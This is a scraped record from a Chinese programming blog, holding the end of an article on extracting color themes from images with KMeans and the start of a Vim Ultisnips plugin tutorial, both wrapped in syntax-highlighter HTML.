crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfrom sklearn.cluster import KMeans as KM\r\nimport numpy as np\r\n\r\n#@pixData      image pixels stored in numpy.ndarray\r\n#@maxColor     theme color number\r\nh, w, d = pixData.shape\r\ndata = np.reshape((h*w, d))\r\nkm = KM(n_clusters=maxColor)\r\nkm.fit(data)\r\ntheme = np.array(km.cluster_centers_, dtype=np.uint8)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67035442e756714063-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035442e756714063-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035442e756714063-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035442e756714063-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035442e756714063-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035442e756714063-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035442e756714063-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035442e756714063-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab67035442e756714063-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67035442e756714063-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67035442e756714063-1\"><span class=\"crayon-e\">from </span><span class=\"crayon-v\">sklearn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">cluster </span><span class=\"crayon-e\">import </span><span class=\"crayon-e\">KMeans </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">KM</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035442e756714063-2\"><span class=\"crayon-e\">import </span><span class=\"crayon-e\">numpy </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">np</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035442e756714063-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035442e756714063-4\"><span class=\"crayon-p\">#@pixData      image pixels stored in numpy.ndarray</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035442e756714063-5\"><span class=\"crayon-p\">#@maxColor     theme color number</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035442e756714063-6\"><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">w</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pixData</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">shape</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035442e756714063-7\"><span class=\"crayon-v\">data</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">reshape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">h*</span><span class=\"crayon-v\">w</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035442e756714063-8\"><span class=\"crayon-v\">km</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">KM</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n_clusters</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">maxColor</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab67035442e756714063-9\"><span class=\"crayon-v\">km</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">fit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">data</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67035442e756714063-10\"><span class=\"crayon-v\">theme</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">array</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">km</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">cluster_centers_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dtype</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">uint8</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n\n</div>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670354431313053196\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nimgs = map(lambda i: 'imgs/photo%s.jpg' % i, range(1,5))\r\npixDatas = list(map(getPixData, imgs))\r\nmaxColor = 7\r\nthemes = [testKmeans(pixDatas, maxColor), testKmeans(pixDatas, maxColor, useSklearn=False)]\r\nimgPalette(pixDatas, themes, [\"KMeans Palette\", \"KMeans DIY\"])</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670354431313053196-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354431313053196-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670354431313053196-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670354431313053196-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670354431313053196-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670354431313053196-1\"><span class=\"crayon-v\">imgs</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'imgs/photo%s.jpg'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354431313053196-2\"><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">list</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">getPixData</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">imgs</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670354431313053196-3\"><span class=\"crayon-v\">maxColor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670354431313053196-4\"><span class=\"crayon-v\">themes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">testKmeans</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">maxColor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">testKmeans</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">maxColor</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">useSklearn</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab670354431313053196-5\"><span class=\"crayon-e\">imgPalette</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pixDatas</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">themes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">\"KMeans Palette\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"KMeans DIY\"</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n\n</div>\n<p>测试比较手动实现和scikit-learn的结果如下：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/8fa5b30b6c4737d28e3b8d4fec0d0715.png\" alt=\"KMeans vs DIY\"></p>\n<p>好吧我承认很惨，耗时方面也是惨不忍睹。</p>\n<h1>3. 色彩建模</h1>\n<p>从上面几种算法结果来看，MMCQ和 KMeans在时间和结果上都还算不错，但仍有改进的空间。如果从人类的角度出发，两种算法的策略或者说在解决主题色提取这一问题时采纳的特征（feature）都接近于颜色密度，即相近的颜色凑在一起数量越多，越容易被提取为主题颜色。</p>\n<p>最后要提到的算法来自<a href=\"http://vis.stanford.edu/\">斯坦福可视化组</a>13年的一篇研究：<a href=\"http://dl.acm.org/citation.cfm?id=2466424\">Modeling how people extract color themes from images</a>，实际上比较像一篇心理学研究的套路：建模-找人类被试进行行为实验-调参拟合。文章提取了图像中的79个特征变量并进行多元回归，同时找到普通人类被试和艺术系学生对图像的主题颜色进行选择，结果证明特征+回归能够更好地拟合人类选择的结果。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/c51d20b56423c4d9141118f36f1fa593.png\" alt=\"all color themes\"></p>\n<p>79个特征的多元回归模型，不知道会不会出现过度拟合？另外虽然比前面算法多了很多特征，但仍旧多物理特征。对人类观察者来说，我们看到的并非一堆无意义的色块，虽然有研究表明颜色信息并非场景识别的必要线索，但反过来场景图像中的语义信息却很有可能影响颜色对观察者的意义，这大概就是心理学研究与计算机科学方向上的差异。</p>\n<h1>总结</h1>\n<p>以上算法若要应用还需更多优化，例如先抽样再处理，计算密集的地方用C/C++或并行等。另外需要一个对Python每个函数执行时间进行记录的工具，分析运行时间长的部分。</p>\n<h1>参考</h1>\n<ol>\n<li><a href=\"http://tpgit.github.io/UnOfficialLeptDocs/leptonica/color-quantization.html\">Color Quantization</a></li>\n<li><a href=\"http://leptonica.com/papers/mediancut.pdf\">Color quantization using modified median cut</a></li>\n<li><a href=\"http://collaboration.cmc.ec.gc.ca/science/rpn/biblio/ddj/Website/articles/DDJ/1994/9409/9409e/9409e.htm\">Median-Cut Color Quantization</a></li>\n<li><a href=\"http://www.microsoft.com/msj/archive/S3F1.aspx\">Wicked Code</a></li>\n<li><a href=\"http://scikit-learn.org/stable/modules/clustering.html#k-means\">Clustering – scikit-learn</a></li>\n<li><a href=\"http://scikit-learn.org/stable/auto_examples/cluster/plot_color_quantization.html\">Color Quantization using K-Means</a></li>\n<li><a href=\"https://github.com/rainyear/ImageColorTheme\">Extract Color Themes from Images</a></li>\n<li>Lin, S., &amp; Hanrahan, P. (2013). Modeling how people extract color themes from images. Proc of Chi Acm, 3101-3110.</li>\n</ol>\n</section>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114372\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114372votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114372\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/f988bd35264f4e1d427950ba55f20e8480fc812e.jpg"}
{"title": "Vim 代码片段插件 Ultisnips 使用教程", "url": "http://blog.jobbole.com/114334/", "create_date": "2018/09/03", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/04/vim-logo.png"], "url_object_id": "79445093886c4e80da466451fddd40b4", "praise_nums": 2, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,Vim", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/keelii\">keelii</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><h2 id=\"安装\">安装</h2>\n<p><a href=\"https://github.com/SirVer/ultisnips\">Ultisnips</a> 插件安装分两部分，一个是 ultisnips 插件本身，另外一个是代码片段仓库。一般来说把默认的代码片段仓库下载下来按需修改后上传到自己的 github 即可。如果你和我一样也使用 vim-plug 来管理插件的话，添加下面的代码到你的 vimrc 中保存刷新即可</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67066706a760090285\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nPlug 'SirVer/ultisnips'\r\n# 你自己的代码仓库 git 地址\r\nPlug 'keelii/vim-snippets'</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67066706a760090285-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67066706a760090285-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67066706a760090285-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67066706a760090285-1\"><span class=\"crayon-i\">Plug</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'SirVer/ultisnips'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67066706a760090285-2\"><span class=\"crayon-p\"># 你自己的代码仓库 git 地址</span></div><div class=\"crayon-line\" id=\"crayon-5bab67066706a760090285-3\"><span class=\"crayon-i\">Plug</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'keelii/vim-snippets'</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>上面的示例中所有的代码片段都存放在插件安装目录下面的 <code>vim-snippets/UltiSnips</code> 中，文件命名格式为 <code>ft</code>.snippets, <code>ft</code> 就是 vim 中的 <code>filetype</code>，其中有个 <code>all.snippets</code> 是唯一一个所有文件都适用的代码片段</p>\n<h2 id=\"配置\">配置</h2>\n<p>快捷键设置，我一般使用 tab 来触发代码片段补全，<strong>且不使用 YCM</strong> （官方文档表示使用YCM的话就不能使用tab补全）</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670667074618756473\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlet g:UltiSnipsExpandTrigger=\"&lt;tab&gt;\"\r\n\" 使用 tab 切换下一个触发点，shit+tab 上一个触发点\r\nlet g:UltiSnipsJumpForwardTrigger=\"&lt;tab&gt;\"\r\nlet g:UltiSnipsJumpBackwardTrigger=\"&lt;S-tab&gt;\"\r\n\" 使用 UltiSnipsEdit 命令时垂直分割屏幕\r\nlet g:UltiSnipsEditSplit=\"vertical\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670667074618756473-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670667074618756473-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670667074618756473-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670667074618756473-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670667074618756473-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670667074618756473-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670667074618756473-1\"><span class=\"crayon-i\">let</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">UltiSnipsExpandTrigger</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"&lt;tab&gt;\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670667074618756473-2\"><span class=\"crayon-s\">\" 使用 tab 切换下一个触发点，shit+tab 上一个触发点</span></div><div class=\"crayon-line\" id=\"crayon-5bab670667074618756473-3\"><span class=\"crayon-s\">let g:UltiSnipsJumpForwardTrigger=\"</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">tab</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-s\">\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670667074618756473-4\"><span class=\"crayon-s\">let g:UltiSnipsJumpBackwardTrigger=\"</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">S</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tab</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-s\">\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab670667074618756473-5\"><span class=\"crayon-s\">\"</span><span class=\"crayon-h\"> </span>使用<span class=\"crayon-h\"> </span><span class=\"crayon-i\">UltiSnipsEdit</span><span class=\"crayon-h\"> </span>命令时垂直分割屏幕</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670667074618756473-6\"><span class=\"crayon-i\">let</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">g</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">UltiSnipsEditSplit</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"vertical\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p></p>\n<h2 id=\"依赖\">依赖</h2>\n<p>ultisnips 插件需要你的 vim 支持 python，可以在 vim 命令模式下使用下面的检测你的 vim 版本是否支持 python</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67066707a092487171\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# 1 表示支持\r\n:echo has(\"python\")\r\n:echo has(\"python3\")</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67066707a092487171-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67066707a092487171-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67066707a092487171-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; 